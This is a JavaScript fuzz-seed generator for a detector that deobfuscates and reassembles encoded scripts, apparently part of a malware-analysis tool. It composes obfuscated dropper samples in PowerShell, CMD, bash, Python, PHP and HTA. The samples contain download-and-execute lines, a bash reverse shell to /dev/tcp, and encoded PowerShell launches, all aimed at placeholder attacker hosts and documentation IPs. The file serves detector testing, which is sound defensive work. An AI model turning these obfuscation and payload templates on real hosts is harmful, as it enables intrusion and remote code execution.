'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/multi-technique-grammar.js — deterministic seed generator for
// MULTI-TECHNIQUE, MULTI-LINE obfuscated scripts that exercise the
// `EncodedReassembler` whole-file stitching path.
//
// The per-shell grammars (cmd-grammar, powershell-grammar, bash-grammar,
// python-grammar, php-grammar) emit seeds that trigger ONE decoder branch
// at one byte offset. That shape is correct for fuzzing the per-shell
// finder/decoder, but it's structurally insufficient for the reassembler:
// `EncodedReassembler.build()` needs at LEAST two top-level
// `EncodedContentDetector` findings at DIFFERENT byte offsets
// (MIN_FINDINGS_USED = 2) before it produces a stitched reconstruction.
//
// This grammar therefore emits seeds whose source carries N ≥ 2 distinct
// encoded atoms (Base64 URL here, char-array IP there, cmd-obfuscation
// elsewhere — all feeding one `iex` / `eval` wrapper). Each atom encodes a
// distinctive IOC (URL, IP, `/dev/tcp/…` atom, hex-hash lookalike) that
// the test target will look for in the sentinel-stripped stitched body
// via `analyze()`'s `extractInterestingStringsCore` sweep. Recovering all
// `_expectedIocs` atoms is the "win condition" — every miss rolls up to
// the `expected-ioc-missed` technique counter.
//
// Two seed streams:
//   1. Primitive composer     — `scaffoldX([atom1, atom2, ...])` wraps
//                               pre-encoded atoms in a one-payload script
//                               (PS iex, CMD for /f chain, HTA <script>,
//                               bash eval, etc.) so EVERY atom ends up as
//                               a distinct detector finding inside one
//                               source.
//   2. Pair-concatenation     — `pairConcat(a, b)` Buffer-concats two
//                               existing per-shell grammar seeds with a
//                               line separator. Less coherent than the
//                               composer (two unrelated scripts back-to-
//                               back) but catches long-tail cross-decoder
//                               interactions the curated composer misses.
//
// ─── Reassembly-outcome catalog ─────────────────────────────────────────────
// The technique catalog this grammar exposes describes REASSEMBLY
// OUTCOMES, not decoder techniques. `scripts/fuzz_coverage_aggregate.py`
// parses the constant verbatim (the `const [A-Z_]+_TECHNIQUE_CATALOG\s*=\s*
// Object\.freeze\(\[…\])` regex) so the aggregator can render the
// per-outcome table under `§ Obfuscation technique coverage` in
// `dist/fuzz-coverage/summary.md`.
// ════════════════════════════════════════════════════════════════════════════

const REASSEMBLY_TECHNIQUE_CATALOG = Object.freeze([
  // ── Structural outcomes (build()) ──
  'reassembly: built ≥2 spans',
  'reassembly: too-few-findings skip',
  'reassembly: below-coverage skip',
  'reassembly: too-few-after-overlap-resolution skip',
  'reassembly: truncated',
  'reassembly: overlap-collision',
  'reassembly: techniques-mixed',

  // ── Semantic outcomes (analyze()) ──
  // The primary win-condition signal. `_expectedIocs` atoms are IOC
  // strings the analyst would expect to pivot on after stitching;
  // `all-expected-iocs-surfaced` means reassembly + IOC-re-extract
  // recovered them all, `expected-ioc-missed` means at least one atom
  // is absent from BOTH `recon.text` and `analysis.novelIocs`.
  'reassembly: novel-ioc-surfaced',
  'reassembly: all-expected-iocs-surfaced',
  'reassembly: expected-ioc-missed',
]);

// ── Deterministic xorshift32 PRNG (no Math.random / Date.now / os.*) ────────
function makeRng(seed) {
  let s = (seed | 0) || 0xAB5EAB1E;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, opts) {
  const buf = Buffer.from(text, 'utf8');
  const o = opts || {};
  if (Array.isArray(o.expectedIocs) && o.expectedIocs.length > 0) {
    Object.defineProperty(buf, '_expectedIocs', {
      value: Object.freeze(o.expectedIocs.slice()),
      enumerable: false,
    });
  }
  if (Array.isArray(o.expectedTechniques) && o.expectedTechniques.length > 0) {
    Object.defineProperty(buf, '_expectedTechniques', {
      value: Object.freeze(o.expectedTechniques.slice()),
      enumerable: false,
    });
  }
  // Preserve the per-shell grammar's `_expectedSubstring` convention too
  // — the reassembly target uses it as a single-atom fallback when a
  // pair-concat seed doesn't declare a full IOC list.
  if (typeof o.expectedSubstring === 'string' && o.expectedSubstring.length > 0) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: o.expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Distinctive IOC atoms ──────────────────────────────────────────────────
// Each composite seed draws atoms from these pools. The URLs / IPs /
// hash-lookalikes are deliberately distinctive (avoid 1.1.1.1 /
// 8.8.8.8 / example.com — those appear in whitelists) so the
// IOC-extract sweep over the stitched body unambiguously attributes
// them to the reassembly. Use RFC-5737 documentation IPs
// (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) mixed with
// attacker-shaped FQDNs.
const ATTACKER_URLS = Object.freeze([
  'http://stage2.attacker-ops-7.example/install.ps1',
  'https://cdn-update.malware-host-42.example/p/a.exe',
  'http://203.0.113.77:8080/beacon',
  'https://c2.evil-corp-99.example/drop/stage3',
  'http://malware-drop-13.example/x',
  'https://update-service-71.badcorp.example/j.js',
]);
const ATTACKER_IPS = Object.freeze([
  '198.51.100.42',
  '203.0.113.188',
  '192.0.2.66',
  '198.51.100.177',
  '203.0.113.9',
]);
const ATTACKER_HASHES = Object.freeze([
  // SHA-256-shaped (64 hex), deliberately not matching any famous hash
  'a1b2c3d4e5f60718293a4b5c6d7e8f90112233445566778899aabbccddeeff00',
  '0123456789abcdef0123456789abcdeffedcba9876543210fedcba9876543210',
  'cafebabedeadbeef0f1e2d3c4b5a6978879665544332211008fffeeddccbbaa0',
]);
const ATTACKER_DEVTCP = Object.freeze([
  '/dev/tcp/198.51.100.42/4444',
  '/dev/tcp/203.0.113.188/8080',
]);

// ── Primitive encoders (per-decoder atom builders) ─────────────────────────
// Each returns `{ encoded, ioc }`. `encoded` is the in-source text that
// triggers one detector / decoder branch; `ioc` is the atom the decoder
// recovers (a URL / IP / atom) — used to populate `_expectedIocs`.
//
// We DO NOT require the decoder to fully roundtrip every atom — in
// practice some encodings are detection-only (live-fetch `curl | sh`)
// or surface only the outer-level container. The reassembly target
// treats a miss as a soft signal, not a crash (see § reassembly target).

function encBase64(atom) {
  return {
    encoded: Buffer.from(atom, 'utf8').toString('base64'),
    ioc: atom,
  };
}

function encBase64WrappedPs(atom) {
  // `[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("…"))`
  const b64 = Buffer.from(atom, 'utf8').toString('base64');
  return {
    encoded:
      `[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b64}"))`,
    ioc: atom,
  };
}

function encCharArray(atom) {
  // PowerShell char-array — `[char[]]@(0x68,0x74,…) -join ''`. The
  // EncodedContentDetector's char-array finder reassembles the code
  // points into a string.
  const codes = [];
  for (let i = 0; i < atom.length; i++) codes.push('0x' + atom.charCodeAt(i).toString(16));
  return {
    encoded: `([char[]]@(${codes.join(',')}) -join '')`,
    ioc: atom,
  };
}

function encHexString(atom) {
  // -join (($hex -split '(..)') | ForEach-Object { [char][Convert]::ToInt32($_,16) })
  // We emit the plain hex form inside a comment-less wrapper; the
  // detector's hex finder recovers the URL via the base64/hex decoder.
  const hex = Buffer.from(atom, 'utf8').toString('hex');
  return {
    encoded: `"${hex}"`,
    ioc: atom,
  };
}

function encPsStringConcat(atom) {
  // Paren-wrapped split-string concatenation. Requires the joined
  // result to match SENSITIVE_CMD_KEYWORDS — so this is primarily
  // useful for atoms that already contain 'Invoke-Expression' etc.
  // For arbitrary URL atoms we fall back to a plain quoted string
  // inside an `iex` wrapper where the enclosing keyword carries the
  // sensitivity signal.
  if (atom.length < 6) return { encoded: `'${atom}'`, ioc: atom };
  const third = Math.max(1, Math.floor(atom.length / 3));
  const twoThird = Math.max(third + 1, Math.floor(2 * atom.length / 3));
  const a = atom.slice(0, third);
  const b = atom.slice(third, twoThird);
  const c = atom.slice(twoThird);
  return {
    encoded: `('${a}'+'${b}'+'${c}')`,
    ioc: atom,
  };
}

function encPsBacktick(atom) {
  // `I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n — backtick escape between every
  // two characters. Useful for atoms that ARE sensitive keywords.
  const out = [];
  for (let i = 0; i < atom.length; i++) {
    if (i > 0) out.push('`');
    out.push(atom[i]);
  }
  return { encoded: out.join(''), ioc: atom };
}

function encCmdCaret(atom) {
  // CMD caret insertion: 'p^o^w^e^r^s^h^e^l^l'. The decoder strips
  // carets on an exec-context line.
  const out = [];
  for (let i = 0; i < atom.length; i++) {
    if (i > 0) out.push('^');
    out.push(atom[i]);
  }
  return { encoded: out.join(''), ioc: atom };
}

function encBashHexPrintf(atom) {
  // printf '\xNN\xNN…' — recovered as UTF-8 bytes by the bash
  // obfuscation decoder's printf-chain branch.
  const out = [];
  for (let i = 0; i < atom.length; i++) {
    out.push('\\x' + atom.charCodeAt(i).toString(16).padStart(2, '0'));
  }
  return { encoded: `printf '${out.join('')}'`, ioc: atom };
}

function encBashAnsiC(atom) {
  // $'\xNN\xNN…' ANSI-C quoting. Same byte recovery as printf chain.
  const out = [];
  for (let i = 0; i < atom.length; i++) {
    out.push('\\x' + atom.charCodeAt(i).toString(16).padStart(2, '0'));
  }
  return { encoded: `$'${out.join('')}'`, ioc: atom };
}

function encPythonChrJoin(atom) {
  // ''.join([chr(N), chr(N), …]) — Python obfuscation decoder's
  // chr-join branch.
  const codes = [];
  for (let i = 0; i < atom.length; i++) codes.push(`chr(${atom.charCodeAt(i)})`);
  return { encoded: `''.join([${codes.join(',')}])`, ioc: atom };
}

function encPhpChrDot(atom) {
  // chr(N) . chr(N) . … — PHP obfuscation decoder's chr-concat branch.
  const codes = [];
  for (let i = 0; i < atom.length; i++) codes.push(`chr(${atom.charCodeAt(i)})`);
  return { encoded: codes.join('.'), ioc: atom };
}

function encPhpBase64(atom) {
  // base64_decode("…")
  const b64 = Buffer.from(atom, 'utf8').toString('base64');
  return { encoded: `base64_decode("${b64}")`, ioc: atom };
}

// ── Composite scaffolds (one multi-atom script per call) ───────────────────

function psIexWrapper(atoms) {
  // $a=ENC1; $b=ENC2; $c=ENC3; iex "$a $b $c"
  // Each ENC_i is on its own line at a distinct byte offset so the
  // detector emits N top-level findings.
  const names = ['a', 'b', 'c', 'd', 'e'];
  const lines = [];
  for (let i = 0; i < atoms.length; i++) {
    lines.push(`$${names[i % names.length]} = ${atoms[i].encoded}`);
  }
  lines.push(`iex "$${names[0]}"`);
  return lines.join('\n');
}

function psDownloadStringWrapper(atoms) {
  // IEX(New-Object Net.WebClient).DownloadString(<enc1>)
  // $headers = <enc2>
  // $cookies = <enc3>
  const lines = [
    `IEX ((New-Object Net.WebClient).DownloadString(${atoms[0].encoded}))`,
  ];
  for (let i = 1; i < atoms.length; i++) {
    lines.push(`$v${i} = ${atoms[i].encoded}`);
  }
  return lines.join('\n');
}

function cmdForFChain(atoms) {
  // for /f %X in ('<enc1>') do call %X
  // set V1=<enc2>
  // set V2=<enc3>
  const lines = [
    `for /f %X in ('${atoms[0].encoded}') do call %X`,
  ];
  for (let i = 1; i < atoms.length; i++) {
    lines.push(`set V${i}=${atoms[i].encoded}`);
  }
  return lines.join('\r\n');
}

function htaMixedBlock(atoms) {
  // .hta-shaped: multiple <script> blocks each carrying one atom.
  const blocks = [];
  blocks.push('<html><head><hta:application id="a"/>');
  for (let i = 0; i < atoms.length; i++) {
    blocks.push(`<script language="VBScript">Dim v${i} : v${i} = "${atoms[i].encoded}"</script>`);
  }
  blocks.push('</head><body></body></html>');
  return blocks.join('\n');
}

function bashEvalConcat(atoms) {
  // A=<enc1>; B=<enc2>; eval "$A $B"
  const names = ['A', 'B', 'C', 'D', 'E'];
  const lines = [];
  for (let i = 0; i < atoms.length; i++) {
    lines.push(`${names[i % names.length]}=${atoms[i].encoded}`);
  }
  lines.push(`eval "$${names[0]}"`);
  return lines.join('\n');
}

function pythonExecConcat(atoms) {
  // x1 = <enc1>
  // x2 = <enc2>
  // exec(x1 + x2)
  const lines = [];
  for (let i = 0; i < atoms.length; i++) {
    lines.push(`x${i + 1} = ${atoms[i].encoded}`);
  }
  lines.push(`exec(${atoms.map((_, i) => `x${i + 1}`).join(' + ')})`);
  return lines.join('\n');
}

function phpEvalConcat(atoms) {
  // <?php $a = <enc1>; $b = <enc2>; eval($a . $b); ?>
  const names = ['a', 'b', 'c', 'd', 'e'];
  const lines = ['<?php'];
  for (let i = 0; i < atoms.length; i++) {
    lines.push(`$${names[i % names.length]} = ${atoms[i].encoded};`);
  }
  lines.push(`eval($${names[0]} . $${names[1 % names.length]});`);
  lines.push('?>');
  return lines.join('\n');
}

// ── Seed families ──────────────────────────────────────────────────────────

function genPsMultiTechnique(rng) {
  // PowerShell: mix base64 + char-array + backtick-escape + string-concat
  // across one iex wrapper.
  const out = [];

  // Three parallel URL atoms, each via a different encoding.
  {
    const a1 = encBase64WrappedPs(rng.pick(ATTACKER_URLS));
    const a2 = encCharArray(rng.pick(ATTACKER_URLS));
    const a3 = encPsStringConcat('Invoke-Expression');
    out.push(makeSeed(psIexWrapper([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a2.ioc],
      expectedTechniques: ['Base64', 'Char Array'],
    }));
  }

  // IP + URL + sensitive-keyword concat
  {
    const a1 = encBase64(rng.pick(ATTACKER_IPS));
    const a2 = encCharArray(rng.pick(ATTACKER_URLS));
    const a3 = encPsBacktick('DownloadString');
    out.push(makeSeed(psDownloadStringWrapper([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a2.ioc],
      expectedTechniques: ['Base64', 'Char Array', 'PowerShell Backtick Escape'],
    }));
  }

  // Four-atom payload — URL + URL + IP + keyword
  {
    const a1 = encBase64WrappedPs(rng.pick(ATTACKER_URLS));
    const a2 = encBase64(rng.pick(ATTACKER_URLS));
    const a3 = encCharArray(rng.pick(ATTACKER_IPS));
    const a4 = encPsBacktick('Invoke-Expression');
    out.push(makeSeed(psIexWrapper([a1, a2, a3, a4]), {
      expectedIocs: [a1.ioc, a2.ioc, a3.ioc],
      expectedTechniques: ['Base64', 'Char Array', 'PowerShell Backtick Escape'],
    }));
  }

  return out;
}

function genCmdMultiTechnique(rng) {
  // CMD: for /f chain + caret-insertion + embedded base64 across one file.
  const out = [];

  {
    const a1 = encBase64(rng.pick(ATTACKER_URLS));
    const a2 = encCmdCaret('powershell');
    const a3 = encBase64(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(cmdForFChain([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a3.ioc],
      expectedTechniques: ['Base64', 'CMD Caret Insertion'],
    }));
  }

  {
    const a1 = encBase64(rng.pick(ATTACKER_URLS));
    const a2 = encBase64(rng.pick(ATTACKER_HASHES));
    const a3 = encCharArray(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(cmdForFChain([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a2.ioc, a3.ioc],
      expectedTechniques: ['Base64', 'Char Array'],
    }));
  }

  return out;
}

function genBashMultiTechnique(rng) {
  // Bash: printf '\xNN' chain + $'…' ANSI-C + embedded base64 + /dev/tcp.
  const out = [];

  {
    const a1 = encBashHexPrintf('curl -sL ' + rng.pick(ATTACKER_URLS));
    const a2 = encBashAnsiC('sh -i');
    const a3 = encBase64(rng.pick(ATTACKER_URLS));
    out.push(makeSeed(bashEvalConcat([a1, a2, a3]), {
      expectedIocs: [a3.ioc],
      expectedTechniques: ['Base64', 'Bash printf Chain', 'Bash ANSI-C Quoting'],
    }));
  }

  {
    const devtcp = rng.pick(ATTACKER_DEVTCP);
    const a1 = encBase64('bash -i >& ' + devtcp + ' 0>&1');
    const a2 = encBashHexPrintf(devtcp);
    const a3 = encBase64(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(bashEvalConcat([a1, a2, a3]), {
      expectedIocs: [a3.ioc, devtcp.split('/').slice(0, 3).join('/') + '/'],
      expectedTechniques: ['Base64', 'Bash printf Chain'],
    }));
  }

  return out;
}

function genPythonMultiTechnique(rng) {
  // Python: chr-join + base64 + hex-string chained through exec.
  const out = [];

  {
    const a1 = encPythonChrJoin('import socket');
    const a2 = encBase64(rng.pick(ATTACKER_URLS));
    const a3 = encHexString(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(pythonExecConcat([a1, a2, a3]), {
      expectedIocs: [a2.ioc],
      expectedTechniques: ['Base64'],
    }));
  }

  {
    const a1 = encBase64(rng.pick(ATTACKER_URLS));
    const a2 = encBase64(rng.pick(ATTACKER_IPS));
    const a3 = encPythonChrJoin('os.system');
    out.push(makeSeed(pythonExecConcat([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a2.ioc],
      expectedTechniques: ['Base64'],
    }));
  }

  return out;
}

function genPhpMultiTechnique(rng) {
  // PHP: base64_decode + chr concat + eval wrapper.
  const out = [];

  {
    const a1 = encPhpBase64(rng.pick(ATTACKER_URLS));
    const a2 = encPhpChrDot('system');
    const a3 = encPhpBase64(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(phpEvalConcat([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a3.ioc],
      expectedTechniques: ['Base64'],
    }));
  }

  return out;
}

function genHtaMultiTechnique(rng) {
  // Browser-/HTA-shaped multi-block source — parallel <script> blocks
  // each carrying its own encoded atom.
  const out = [];

  {
    const a1 = encBase64(rng.pick(ATTACKER_URLS));
    const a2 = encBase64(rng.pick(ATTACKER_URLS));
    const a3 = encCharArray(rng.pick(ATTACKER_IPS));
    out.push(makeSeed(htaMixedBlock([a1, a2, a3]), {
      expectedIocs: [a1.ioc, a2.ioc, a3.ioc],
      expectedTechniques: ['Base64', 'Char Array'],
    }));
  }

  return out;
}

function genHandRolledClassicDroppers() {
  // Ten hand-written "famous dropper" shapes. Each is a real-world-
  // inspired multi-technique script that should produce ≥2 detector
  // findings and therefore exercise `EncodedReassembler.build()`.
  const out = [];

  // 1. PS iex wrapping three base64 atoms, each one a URL.
  {
    const u1 = 'http://stage2.attacker-ops-7.example/install.ps1';
    const u2 = 'https://cdn-update.malware-host-42.example/p/a.exe';
    const u3 = 'http://malware-drop-13.example/x';
    const b1 = Buffer.from(u1, 'utf8').toString('base64');
    const b2 = Buffer.from(u2, 'utf8').toString('base64');
    const b3 = Buffer.from(u3, 'utf8').toString('base64');
    out.push(makeSeed(
      `$a = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b1}"))\n`
      + `$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b2}"))\n`
      + `$c = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b3}"))\n`
      + 'IEX ((New-Object Net.WebClient).DownloadString("$a$b$c"))',
      { expectedIocs: [u1, u2, u3] },
    ));
  }

  // 2. CMD caret-insertion wrapping one IP, Base64 wrapping one URL.
  {
    const url = 'http://203.0.113.77:8080/beacon';
    const ip = '198.51.100.42';
    const b = Buffer.from(url, 'utf8').toString('base64');
    out.push(makeSeed(
      `@echo off\r\nset U=${b}\r\n`
      + 'p^o^w^e^r^s^h^e^l^l -nop -c "iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:U)))"\r\n'
      + `ping ${ip}\r\n`,
      { expectedIocs: [url, ip] },
    ));
  }

  // 3. HTA with parallel Base64 + char-array + embedded URL atoms.
  {
    const u1 = 'https://c2.evil-corp-99.example/drop/stage3';
    const u2 = 'http://203.0.113.77:8080/beacon';
    const b1 = Buffer.from(u1, 'utf8').toString('base64');
    const codes = [];
    for (let i = 0; i < u2.length; i++) codes.push('0x' + u2.charCodeAt(i).toString(16));
    out.push(makeSeed(
      '<html><head><hta:application id="x"/>\n'
      + `<script language="VBScript">Dim a : a = "${b1}"</script>\n`
      + `<script>var b = [${codes.join(',')}].map(function(c){return String.fromCharCode(c)}).join('');</script>\n`
      + '<script>new ActiveXObject("WScript.Shell").Run("powershell -nop -enc " + a);</script>\n'
      + '</head></html>',
      { expectedIocs: [u1, u2] },
    ));
  }

  // 4. Bash one-liner: printf hex + base64 + /dev/tcp, all on separate lines.
  {
    const ip = '198.51.100.42';
    const devtcp = '/dev/tcp/' + ip + '/4444';
    const payload = 'bash -i >& ' + devtcp + ' 0>&1';
    const b = Buffer.from(payload, 'utf8').toString('base64');
    const printfArg = Array.from('sh -i')
      .map(c => '\\x' + c.charCodeAt(0).toString(16))
      .join('');
    out.push(makeSeed(
      `#!/bin/bash\nPAYLOAD="${b}"\n`
      + `CMD=$(printf '${printfArg}')\n`
      + 'eval "$(echo $PAYLOAD | base64 -d)"\n',
      { expectedIocs: [ip, devtcp] },
    ));
  }

  // 5. Python dropper — chr-join + base64 + hex-string.
  {
    const url = 'https://update-service-71.badcorp.example/j.js';
    const ip = '192.0.2.66';
    const b = Buffer.from(url, 'utf8').toString('base64');
    const chrArr = Array.from('os.system').map(c => `chr(${c.charCodeAt(0)})`).join(',');
    const hex = Buffer.from(ip, 'utf8').toString('hex');
    out.push(makeSeed(
      `import base64, binascii\n`
      + `fn = ''.join([${chrArr}])\n`
      + `url = base64.b64decode("${b}").decode()\n`
      + `ip = binascii.unhexlify("${hex}").decode()\n`
      + `exec(fn + "('curl " + url + " " + ip + "')")\n`,
      { expectedIocs: [url, ip] },
    ));
  }

  // 6. PHP dropper — base64_decode + chr concat + eval.
  {
    const url = 'http://malware-drop-13.example/x';
    const ip = '203.0.113.9';
    const b = Buffer.from(url, 'utf8').toString('base64');
    const chrArr = Array.from('system').map(c => `chr(${c.charCodeAt(0)})`).join('.');
    out.push(makeSeed(
      `<?php\n`
      + `$u = base64_decode("${b}");\n`
      + `$f = ${chrArr};\n`
      + `$i = "${ip}";\n`
      + `$f("curl -sL " . $u . " " . $i);\n`
      + `?>\n`,
      { expectedIocs: [url, ip] },
    ));
  }

  // 7. Mixed-language dropper: PS-in-HTA with a Bash-fallback block.
  {
    const u1 = 'https://c2.evil-corp-99.example/drop/stage3';
    const u2 = 'http://203.0.113.77:8080/beacon';
    const b1 = Buffer.from(u1, 'utf8').toString('base64');
    const b2 = Buffer.from(u2, 'utf8').toString('base64');
    out.push(makeSeed(
      '<html><head><hta:application/>\n'
      + `<script>var a = "${b1}";</script>\n`
      + `<script>var b = "${b2}";</script>\n`
      + '<script>new ActiveXObject("WScript.Shell").Run("powershell -enc " + a);</script>\n'
      + '</head></html>\n',
      { expectedIocs: [u1, u2] },
    ));
  }

  // 8. Three-atom PS payload where each atom resolves to part of one URL.
  //   (Exercises EncodedReassembler's stitching of atoms that together
  //    form a single recoverable IOC.)
  {
    const url = 'http://stage2.attacker-ops-7.example/install.ps1';
    const third = Math.floor(url.length / 3);
    const p1 = url.slice(0, third);
    const p2 = url.slice(third, 2 * third);
    const p3 = url.slice(2 * third);
    const b1 = Buffer.from(p1, 'utf8').toString('base64');
    const b2 = Buffer.from(p2, 'utf8').toString('base64');
    const b3 = Buffer.from(p3, 'utf8').toString('base64');
    out.push(makeSeed(
      `$a = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b1}"))\n`
      + `$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b2}"))\n`
      + `$c = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b3}"))\n`
      + 'IEX ((New-Object Net.WebClient).DownloadString("$a$b$c"))',
      { expectedIocs: [p1, p2, p3] },
    ));
  }

  // 9. Overlap-path seed: two encodings of the same atom at adjacent
  //    offsets — exercises EncodedReassembler's overlap-resolution branch.
  {
    const url = 'https://cdn-update.malware-host-42.example/p/a.exe';
    const b = Buffer.from(url, 'utf8').toString('base64');
    const codes = [];
    for (let i = 0; i < url.length; i++) codes.push('0x' + url.charCodeAt(i).toString(16));
    out.push(makeSeed(
      `$v1 = "${b}"\n`
      + `$v2 = ([char[]]@(${codes.join(',')}) -join '')\n`
      + '$combined = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($v1)) + $v2\n'
      + 'iex $combined\n',
      { expectedIocs: [url] },
    ));
  }

  // 10. Truncation-path seed: very many small encoded atoms in one file.
  //     Purpose: push MAX_FINDINGS (64) / MAX_OUTPUT_BYTES (4 MiB) so
  //     the `truncated = true` branch gets fuzz coverage.
  {
    const lines = [];
    const u1 = 'http://malware-drop-13.example/x';
    const u2 = 'https://update-service-71.badcorp.example/j.js';
    for (let i = 0; i < 12; i++) {
      const url = (i & 1) ? u1 : u2;
      const b = Buffer.from(url + '?n=' + i, 'utf8').toString('base64');
      lines.push(`$v${i} = "${b}"`);
    }
    lines.push('iex "$v0"');
    out.push(makeSeed(lines.join('\n'), {
      expectedIocs: [u1, u2],
    }));
  }

  return out;
}

/**
 * Pair-concatenate two existing grammar seeds. Produces a less-coherent
 * but still multi-technique composite: two unrelated scripts back-to-
 * back, separated by a null-separated line break, each carrying its own
 * technique. Less realistic than the curated composer above but catches
 * long-tail cross-decoder interactions — some real droppers genuinely
 * ARE two unrelated script blocks pasted into one file.
 *
 * We union `_expectedSubstring` fields into `_expectedIocs` so the
 * reassembly target's win-condition counter still fires.
 */
function pairConcat(a, b) {
  const sep = '\n# --- boundary ---\n';
  const combined = Buffer.concat([a, Buffer.from(sep, 'utf8'), b]);
  const expected = [];
  if (typeof a._expectedSubstring === 'string') expected.push(a._expectedSubstring);
  if (typeof b._expectedSubstring === 'string') expected.push(b._expectedSubstring);
  if (Array.isArray(a._expectedIocs)) for (const v of a._expectedIocs) expected.push(v);
  if (Array.isArray(b._expectedIocs)) for (const v of b._expectedIocs) expected.push(v);
  if (expected.length > 0) {
    Object.defineProperty(combined, '_expectedIocs', {
      value: Object.freeze(Array.from(new Set(expected))),
      enumerable: false,
    });
  }
  return combined;
}

/**
 * Emit `count` deterministic pair-concatenations drawn from the provided
 * `perShellSeeds` bundle. The bundle is built by the caller by importing
 * `generate{Cmd,PowerShell,Bash,Python,Php}Seeds()` from the per-shell
 * grammar modules and passing the concatenated array.
 *
 * We deliberately pick pairs from DIFFERENT grammars when possible (a
 * PS seed paired with a Bash seed is more likely to yield two distinct
 * top-level findings than two CMD seeds that might collapse into one
 * finder's candidate pool).
 */
function generatePairConcatSeeds(perShellSeeds, count) {
  const rng = makeRng(0x70EEEE70);
  const out = [];
  const n = Math.min(count, perShellSeeds.length * 2);
  const pool = perShellSeeds.slice();
  if (pool.length < 2) return out;
  for (let i = 0; i < n; i++) {
    const a = pool[rng.int(pool.length)];
    let b = pool[rng.int(pool.length)];
    // Avoid self-pairs; try once to resample.
    if (b === a) b = pool[rng.int(pool.length)];
    out.push(pairConcat(a, b));
  }
  return out;
}

/**
 * Primary seed generator — curated composites only. The reassembly fuzz
 * target combines this with `generatePairConcatSeeds()` (fed from the
 * per-shell grammars) for the long-tail coverage.
 */
function generateMultiTechniqueSeeds() {
  const rng = makeRng(0xAB5EAB1E);
  return [
    ...genPsMultiTechnique(rng),
    ...genCmdMultiTechnique(rng),
    ...genBashMultiTechnique(rng),
    ...genPythonMultiTechnique(rng),
    ...genPhpMultiTechnique(rng),
    ...genHtaMultiTechnique(rng),
    ...genHandRolledClassicDroppers(),
  ];
}

module.exports = {
  generateMultiTechniqueSeeds,
  generatePairConcatSeeds,
  pairConcat,
  REASSEMBLY_TECHNIQUE_CATALOG,
};
